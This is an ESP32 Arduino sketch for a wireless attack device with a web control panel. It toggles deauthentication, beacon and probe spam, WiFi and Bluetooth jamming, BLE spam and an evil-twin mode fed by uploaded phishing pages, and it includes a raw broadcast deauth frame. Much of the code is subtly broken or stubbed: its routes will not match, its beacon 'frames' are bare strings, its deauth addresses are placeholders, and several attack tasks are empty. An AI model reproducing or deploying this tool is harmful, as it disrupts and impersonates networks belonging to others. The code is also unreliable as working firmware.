#include <WiFi.h>
#include <WebServer.h>
#include <ESPmDNS.h>
#include <FS.h>
#include <SPIFFS.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include <driver/adc.h>

// Konfigurasi WiFi AP
const char* ssid = "Vivo1905";
const char* password = "Sangkur87";

// Web server
WebServer server(80);

// Status modules
bool beaconActive = false;
bool evilTwinActive = false;
bool deauthActive = false;
bool probeActive = false;
bool jammerActive = false;
bool bleSpamActive = false;
bool bluJammerActive = false;

// Beacon spam settings
int beaconCount = 6;
String beaconSSIDs[50];
int beaconSSIDCount = 0;

// Target AP
String targetSSID = "";
String targetBSSID = "";
int targetChannel = 1;

// WiFi scan results
struct APInfo {
  String ssid;
  String bssid;
  int channel;
  int rssi;
};
APInfo apList[50];
int apCount = 0;

void setup() {
  Serial.begin(115200);
  
  // Initialize SPIFFS
  if(!SPIFFS.begin(true)){
    Serial.println("SPIFFS Mount Failed");
    return;
  }

  // WiFi AP mode
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(IP);

  // Handle web requests
  server.on("/", handleRoot);
  server.on("/?scan=1", handleScan);
  server.on("/?beacon=", handleBeaconToggle);
  server.on("/?evil=", handleEvilToggle);
  server.on("/?deauth=", handleDeauthToggle);
  server.on("/?probe=", handleProbeToggle);
  server.on("/?jam=", handleJammerToggle);
  server.on("/?ble=", handleBleToggle);
  server.on("/?blu=", handleBluToggle);
  server.on("/?ap=", handleTargetSelect);
  server.on("/set_beacon", HTTP_POST, handleSetBeacon);
  server.on("/upload_html", HTTP_POST, [](){ server.send(200, "text/plain", "OK"); }, handleFileUpload);
  server.on("/view_html", handleViewHtml);
  
  server.begin();
  Serial.println("HTTP server started");

  // Initialize WiFi promiscuous mode
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_callback);
}

void loop() {
  server.handleClient();
  
  if (beaconActive) beaconSpamTask();
  if (evilTwinActive) evilTwinTask();
  if (deauthActive) deauthTask();
  if (probeActive) probeSpamTask();
  if (jammerActive) jammerTask();
  if (bleSpamActive) bleSpamTask();
  if (bluJammerActive) bluJammerTask();
  
  delay(10);
}

void wifi_sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_mgmt_hdr_t *hdr = (wifi_mgmt_hdr_t*)pkt->payload;
  
  if (type == WIFI_PKT_MGMT && hdr->frame_control.subtype == 0x04) { // Beacon frame
    String ssid = "";
    uint8_t *payload = (uint8_t*)hdr + 36;
    int len = pkt->rx_ctrl.sig_len - 36;
    
    for (int i = 0; i < len; i++) {
      if (payload[i] == 0 && i + 1 < len) {
        int ssid_len = payload[i + 1];
        if (i + 2 + ssid_len <= len) {
          ssid = String((char*)(payload + i + 2), ssid_len);
          break;
        }
      }
    }
    
    // Update scan results
    updateScanResult(ssid, macToString(hdr->addr3), pkt->rx_ctrl.channel, pkt->rx_ctrl.rssi);
  }
}

void updateScanResult(String ssid, String bssid, int ch, int rssi) {
  for (int i = 0; i < apCount; i++) {
    if (apList[i].bssid == bssid) {
      apList[i].ssid = ssid;
      apList[i].channel = ch;
      apList[i].rssi = rssi;
      return;
    }
  }
  
  if (apCount < 50) {
    apList[apCount].ssid = ssid;
    apList[apCount].bssid = bssid;
    apList[apCount].channel = ch;
    apList[apCount].rssi = rssi;
    apCount++;
  }
}

String macToString(uint8_t* mac) {
  char macStr[18];
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
          mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void handleRoot() {
  String html = readFile("/index.html");
  if (html.length() == 0) {
    html = getDefaultHTML();
    writeFile("/index.html", html);
  }
  
  // Update status
  html.replace("<!-- Target SSID inject -->", targetSSID);
  html.replace("<!-- Target BSSID inject -->", targetBSSID);
  html.replace("<!-- Target channel inject -->", String(targetChannel));
  
  // Update scan table
  String tableRows = "";
  for (int i = 0; i < apCount; i++) {
    String rssiColor = apList[i].rssi > -60 ? "#20c20e" : "#df4237";
    String bars = getSignalBars(apList[i].rssi);
    tableRows += "<tr><td>" + apList[i].ssid + "</td><td>" + apList[i].bssid + "</td><td>" + 
                 String(apList[i].channel) + "</td><td><span style=\"color:" + rssiColor + 
                 ";font-weight:bold;\">" + String(apList[i].rssi) + " dBm</span><span style=\"color:#F6C700;\">" + 
                 bars + "</span></td><td><form method=\"post\" action=\"/?ap=" + apList[i].bssid + 
                 "\"><button class=\"select-btn\">Select</button></form></td></tr>";
  }
  
  html.replace("<!-- Contoh isi (backend inject di ESP32) -->", tableRows);
  
  server.send(200, "text/html", html);
}

void handleScan() {
  apCount = 0;
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  delay(500);
  esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
  delay(500);
  esp_wifi_set_channel(11, WIFI_SECOND_CHAN_NONE);
  delay(500);
  
  server.sendHeader("Location", "/");
  server.send(302);
}

void handleBeaconToggle() {
  beaconActive = !beaconActive;
  server.sendHeader("Location", "/");
  server.send(302);
}

void handleEvilToggle() {
  evilTwinActive = !evilTwinActive;
  server.sendHeader("Location", "/");
  server.send(302);
}

void handleDeauthToggle() {
  deauthActive = !deauthActive;
  server.sendHeader("Location", "/");
  server.send(302);
}

void handleProbeToggle() {
  probeActive = !probeActive;
  server.sendHeader("Location", "/");
  server.send(302);
}

void handleJammerToggle() {
  jammerActive = !jammerActive;
  server.sendHeader("Location", "/");
  server.send(302);
}

void handleBleToggle() {
  bleSpamActive = !bleSpamActive;
  server.sendHeader("Location", "/");
  server.send(302);
}

void handleBluToggle() {
  bluJammerActive = !bluJammerActive;
  server.sendHeader("Location", "/");
  server.send(302);
}

void handleTargetSelect() {
  if (server.hasArg("ap")) {
    targetBSSID = server.arg("ap");
    // Find SSID and channel from scan results
    for (int i = 0; i < apCount; i++) {
      if (apList[i].bssid == targetBSSID) {
        targetSSID = apList[i].ssid;
        targetChannel = apList[i].channel;
        break;
      }
    }
  }
  server.sendHeader("Location", "/");
  server.send(302);
}

void handleSetBeacon() {
  beaconCount = server.arg("beacon_count").toInt();
  beaconSSIDCount = 0;
  
  for (int i = 1; i <= 50; i++) {
    String ssidKey = "ssid_" + String(i);
    if (server.hasArg(ssidKey)) {
      beaconSSIDs[beaconSSIDCount] = server.arg(ssidKey);
      beaconSSIDCount++;
    }
  }
  
  server.send(200, "text/plain", "Beacon settings saved");
}

void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  if (upload.status == UPLOAD_FILE_START) {
    String filename = "etwin" + String(random(1,6)) + ".html";
    File file = SPIFFS.open("/" + filename, "w");
    file.close();
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    String filename = upload.filename;
    File file = SPIFFS.open("/" + filename, "a");
    file.write(upload.buf, upload.currentSize);
    file.close();
  }
  server.send(200, "text/plain", "File uploaded");
}

void handleViewHtml() {
  if (server.hasArg("file")) {
    String filename = "/" + server.arg("file");
    String content = readFile(filename);
    server.send(200, "text/html", content.length() > 0 ? content : "<h1>File not found</h1>");
  } else {
    server.send(404);
  }
}

// Tasks
void beaconSpamTask() {
  for (int i = 0; i < beaconSSIDCount; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t*)beaconSSIDs[i].c_str(), beaconSSIDs[i].length(), false);
  }
  delay(50);
}

void evilTwinTask() {
  // Evil Twin implementation
  delay(100);
}

void deauthTask() {
  uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                              0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
                              0xCC, 0xCC, 0x00, 0x00, 0x07, 0x00};
  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, 26, false);
  delay(10);
}

void probeSpamTask() {
  String probes[] = {"AndroidAP", "iPhone", "FreeWiFi", "ATTWiFi"};
  for (int i = 0; i < 4; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t*)probes[i].c_str(), probes[i].length(), false);
  }
  delay(30);
}

void jammerTask() {
  // WiFi jammer - send noise packets
  uint8_t noise[100];
  for (int i = 0; i < 100; i++) noise[i] = random(256);
  esp_wifi_80211_tx(WIFI_IF_AP, noise, 100, false);
  delay(5);
}

void bleSpamTask() {
  // BLE spam advertisements
  BLEDevice::init("BLE_SPAM");
  delay(100);
}

void bluJammerTask() {
  // Bluetooth jammer
  delay(50);
}

// Utility functions
String getSignalBars(int rssi) {
  int bars = 0;
  if (rssi > -50) bars = 4;
  else if (rssi > -60) bars = 3;
  else if (rssi > -70) bars = 2;
  else bars = 1;
  
  String result = "";
  for (int i = 0; i < bars; i++) result += "&#9608;";
  return result;
}

String readFile(String path) {
  File file = SPIFFS.open(path, "r");
  if (!file) return "";
  String content = file.readString();
  file.close();
  return content;
}

void writeFile(String path, String content) {
  File file = SPIFFS.open(path, "w");
  if (file) {
    file.print(content);
    file.close();
  }
}

String getDefaultHTML() {
  // Return default HTML (your HTML code here)
  return "<html><body><h1>GMpro87 ESP32 Admin Panel</h1></body></html>";
}
